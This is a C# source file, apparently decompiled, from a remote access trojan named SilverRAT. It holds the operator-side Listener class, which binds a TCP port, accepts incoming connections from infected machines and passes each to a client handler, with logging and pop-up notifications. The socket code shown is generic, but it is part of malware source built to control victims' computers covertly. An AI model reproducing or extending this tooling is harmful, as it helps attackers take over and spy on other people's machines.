using SilverRAT.Handle_Packet;
using SilverRAT.Helper;
using SilverRAT.Properties;
using System;
using System.Drawing;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;

namespace SilverRAT.Connection;

internal class Listener
{
    private Socket Server { get; set; }

    public void CloseConnection()
    {
        Server.Shutdown(SocketShutdown.Both);
        Server.Close();
    }

    public void Connect(object port)
    {
        try
        {
            IPEndPoint localEP = new IPEndPoint(IPAddress.Any, Convert.ToInt32(port));
            Server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
            {
                SendBufferSize = 51200,
                ReceiveBufferSize = 51200
            };
            Server.Bind(localEP);
            Server.Listen(500);
            new HandleLogs().Addmsg("Socket : Port Listenning " + port, Color.FromArgb(103, 185, 108), Methods.Success);
            Notifiecation.Show("Socket", "Port Listenning " + port, Resources.SuccessNotif, Color.FromArgb(103, 185, 108));
            Server.BeginAccept(EndAccept, null);
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
            Notifiecation.Show("Socket!", ex.Message, Resources.ErrorNotif, Color.FromArgb(204, 102, 90));
            Environment.Exit(0);
        }
    }

    private void EndAccept(IAsyncResult ar)
    {
        try
        {
            new Clients(Server.EndAccept(ar));
        }
        catch
        {
        }
        finally
        {
            Server.BeginAccept(EndAccept, null);
        }
    }
}
